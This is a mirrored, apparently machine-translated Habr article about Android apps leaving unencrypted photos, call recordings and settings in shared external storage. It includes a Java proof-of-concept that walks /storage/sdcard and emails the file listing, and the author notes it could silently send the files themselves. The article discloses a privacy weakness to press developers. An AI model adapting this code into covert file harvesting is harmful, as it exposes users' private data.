<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Application developers do not care about user safety, which leads to data leakage (with java-code examples)</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Delving into my android phone I noticed that in the / storage / sdcard directory there are directories and files - applications that I deleted long ag...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Application developers do not care about user safety, which leads to data leakage (with java-code examples)</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/files/c67/f98/f09/c67f98f0950f471ea26ab5c5b59a60ed.png" align="left">  Delving into my android phone I noticed that in the / storage / sdcard directory there are directories and files - applications that I deleted long ago, so I asked on toster.ru <a href="https://toster.ru/q/288937">Can one Android application read temporary files of another application?</a> <br><br>  What are these temporary files and why should we pay attention to them?  These are your photos, records of telephone conversations, a database of your daily logs. <br><br>  Android has a shared directory / storage / sdcard.  Temporary files are written there by all applications, and when you delete an application, the data from it remains there, unless the developer has taken care to delete them. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      Therefore, I asked these questions on toster.ru: <br><br>  1) By design, the system does not delete these temporary files from this directory? <br>  2) Android does not know which files belong to which application? <br>  3) Can one application read the data of another application from this directory? <br><a name="habracut"></a><br>  User <a href="https://habrahabr.ru/users/neironx/" class="user_link">NeiroNx</a> wrote: <blockquote>  / data is quite clearly divided by rights - not having root application rights do not even see what files are there. </blockquote>  I answer <a href="https://habrahabr.ru/users/neironx/" class="user_link">NeiroNx</a> : Wait, I just downloaded the file manager from google.play and read temporary files from the directory of the popular messenger, and there the photos that were sent to me are unencrypted, the device is not rudimentary. <br><br>  User <a href="https://habrahabr.ru/users/dobergroup/" class="user_link">dobergroup</a> wrote: <blockquote>  What is the path of these files?  If they are in an arbitrary directory on a partition that is in fat32, then they cannot be shared access.  Therefore, it is necessary to clarify what you mean by "temporary files" </blockquote>  I answer <a href="https://habrahabr.ru/users/dobergroup/" class="user_link">dobergroup</a> : Along the path / storage / sdcard, not to be confused with / storage / extSdCard, here are the ‚Äútemporary files‚Äù of all installed applications on my device: messengers, sip telephony with unencrypted records of phone conversations, browsers with browsing history, players with their playlists, social networks, diaries, with personal records of urgent matters. <br><br>  <b>By temporary files, I mean one thing, and application developers are probably different if the messenger developers whatsapp with an audience of <a href="https://play.google.com/store/apps/details%3Fid%3Dcom.whatsapp">33,000,000</a> store unencrypted photos and encrypted correspondence there.</b>  <b>Whatsapp is just an example, almost all popular applications store your personal data in / storage / sdcard /% appName% and any other application can access this directory.</b> <br><br>  For example, this instant messenger stores photos that you have been sent to a directory to which all applications of your device have access, if they have permission to work with the repository: <br><br><img src="https://habrastorage.org/files/056/7c5/58e/0567c558eeae473f87088dd8f91824db.jpg"><br>  <sub>* Photos from the free photo hosting under the license <a href="">Creative Commons CC0</a> .</sub>  <sub><a href="https://pixabay.com/en/arno-river-florence-italy-1066307/">1</a> , <a href="https://pixabay.com/en/salad-lunch-food-healthy-meal-933268/">2</a> , <a href="https://pixabay.com/en/girl-teenager-young-beautiful-teen-375114/">3</a> , <a href="https://pixabay.com/en/guitar-country-girl-music-1139397/">4</a> .</sub> <br><br>  But the popular sip client stores the settings for your sip account there: <br><br><img src="https://habrastorage.org/files/4f3/bc6/b6c/4f3bc6b6cf2a4b9fa043ce43123b8455.png"><br><br><h4>  Temporary files can read any other application? </h4><br>  That is, someone can place the game ‚Äú2048 - play online with friends‚Äù in google.play and drag photos of topless girls from your phone? <br><br>  I decided to check it out and wrote a small java program for android.  It sends the directory structure / storage / sdcard to email. <br><br>  Source.  It sends the / storage / sdcard directory structure to email: <br><pre><code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">package</span></span> android.com.testapp; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.content.Intent; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.os.Environment; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.support.v7.app.AppCompatActivity; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.os.Bundle; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.view.View; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.widget.Button; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.widget.EditText; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.widget.Toast; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> java.io.File; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> java.util.Date; <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">MainActivity</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">AppCompatActivity</span></span></span><span class="hljs-class"> </span></span>{ Button emailButton; EditText email; <span class="hljs-meta"><span class="hljs-meta">@Override</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">protected</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">onCreate</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Bundle savedInstanceState)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">super</span></span>.onCreate(savedInstanceState); setContentView(R.layout.activity_main); email = (EditText) findViewById(R.id.email); emailButton = (Button) findViewById(R.id.emailButton); emailButton.setOnClickListener(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> View.OnClickListener() { <span class="hljs-meta"><span class="hljs-meta">@Override</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">onClick</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(View v)</span></span></span><span class="hljs-function"> </span></span>{ getFileStrucure(); } }); } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">protected</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getFileStrucure</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span></span>{ Filewalker fw = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Filewalker(); fw.walk(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> File(Environment.getExternalStorageDirectory().getAbsolutePath())); } <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Filewalker</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> count = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> String sked = <span class="hljs-string"><span class="hljs-string">""</span></span>; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">walk</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(File root)</span></span></span><span class="hljs-function"> </span></span>{ count++; File[] list = root.listFiles(); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (File f : list) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (f.isDirectory()) { sked += <span class="hljs-string"><span class="hljs-string">"time: "</span></span> + <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Date(f.lastModified()) + <span class="hljs-string"><span class="hljs-string">", dir: "</span></span> + f.getAbsoluteFile() + <span class="hljs-string"><span class="hljs-string">"\n"</span></span>; walk(f); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { sked += <span class="hljs-string"><span class="hljs-string">"time: "</span></span> + <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Date(f.lastModified()) + <span class="hljs-string"><span class="hljs-string">", size: "</span></span> + f.length() + <span class="hljs-string"><span class="hljs-string">", "</span></span> + f.getAbsoluteFile() + <span class="hljs-string"><span class="hljs-string">"\n"</span></span>; } } count--; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (count == <span class="hljs-number"><span class="hljs-number">0</span></span>) { sendMail(sked); } } } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">protected</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">sendMail</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(String sked)</span></span></span><span class="hljs-function"> </span></span>{ Intent i = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(Intent.ACTION_SEND); i.setType(<span class="hljs-string"><span class="hljs-string">"message/rfc822"</span></span>); i.putExtra(Intent.EXTRA_EMAIL, <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> String[]{email.getText().toString()}); i.putExtra(Intent.EXTRA_SUBJECT, <span class="hljs-string"><span class="hljs-string">"android storage structure"</span></span>); i.putExtra(Intent.EXTRA_TEXT, sked); <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { startActivity(Intent.createChooser(i, <span class="hljs-string"><span class="hljs-string">"Send mail..."</span></span>)); } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (android.content.ActivityNotFoundException ex) { Toast.makeText(getApplicationContext(), <span class="hljs-string"><span class="hljs-string">"There are no email clients installed."</span></span>, Toast.LENGTH_SHORT).show(); } } }</code> </pre> <br><br><img src="https://habrastorage.org/files/6e4/bd7/92b/6e4bd792b51d4b7f923cbdb2c0329814.png" width="150" align="left"><img src="https://habrastorage.org/files/d14/389/6b5/d143896b522841eeb9d518bf51e00197.png" width="150" align="left"><br><br>  You enter an email, the application sends the structure of the directory / storage / sdcard, as you understand it, you can do this without asking for email and send, not only the directory structure, but also the files themselves.  Hardly google.play so carefully check the applications that are there.  Unfortunately, this is a very good tool for maktetologov, they always want to know as much as possible about their users, without saying that you can get personal data in this way. <br><br>  But what letter comes to you with the content / storage / sdcard, there will be all the files and directories of applications installed on your device: <br><br><img src="https://habrastorage.org/files/5ff/b64/2bf/5ffb642bfb6a498c92e89262cd1fffc1.png"><br>  <b>* There are no directories and application files from google.play that are on your mobile device that you use every day - this is the android sdcard emulator directory.</b> <br><br>  Link to <a href="https://github.com/irveorg/android_storade_reader">the github repository</a> for informational purposes. <br><br>  Look at your / storage / sdcard directory using any file manager for android, also, in my opinion, it is available when you connect the device to a PC as / phone, if you use instant messengers, social networks, task scheduler, see what theoretically anyone can see developer android, who will write in the manifest android.permission.READ_EXTERNAL_STORAGE. <br><br>  <b>The meaning of the article is that a lot of application developers: soc.</b>  <b>networks, instant messengers, sip telephony clients, diaries, do not care about the safety of their users.</b> </div><p>Source: <a href="https://habr.com/ru/post/277047/">https://habr.com/ru/post/277047/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../277035/index.html">Initial Setup of Extreme Networks Wireless Controllers</a></li>
<li><a href="../277037/index.html">Ultima 2C is a free ERP II class solution based on Ultima Businessware platform.</a></li>
<li><a href="../277041/index.html">Multichannel site upgrade. How to make your life easier</a></li>
<li><a href="../277043/index.html">Ariadna. Why do I need another geocoder for OSM?</a></li>
<li><a href="../277045/index.html">Announcement WordPress Meetup # 2</a></li>
<li><a href="../277049/index.html">Test the training of visual attention</a></li>
<li><a href="../277051/index.html">Report from Tarantool Meetup January 28</a></li>
<li><a href="../277053/index.html">What does DEFAULT TRACE conceal in itself?</a></li>
<li><a href="../277055/index.html">Getting rid of Visual Basic</a></li>
<li><a href="../277057/index.html">Golden App 2016 mobile app competition has started</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>